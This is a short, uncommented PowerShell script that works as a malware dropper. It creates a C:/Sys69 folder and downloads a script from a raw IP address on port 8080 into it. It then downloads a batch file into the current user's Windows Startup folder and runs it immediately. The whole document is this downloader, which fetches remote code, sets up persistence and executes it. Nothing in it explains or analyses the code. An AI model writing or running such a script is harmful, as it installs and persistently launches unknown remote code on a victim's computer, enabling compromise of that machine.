$curpath = Get-Location;
$WebClient = New-Object System.Net.WebClient;
Set-Location /;
if (Test-Path -Path "Sys69") {

}
else {
    mkdir Sys69;
}
Set-Location Sys69;
$WebClient.DownloadFile("http://139.162.197.217:8080/raa.ps1","C:/Sys69/startup.ps1");
Set-Location "~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
$startupdir = Get-Location;
$rouf = Join-Path -Path $startupdir -ChildPath "rouf.bat";
$WebClient.DownloadFile("http://139.162.197.217:8080/rouf.bat", $rouf);
Start-Process -FilePath $rouf

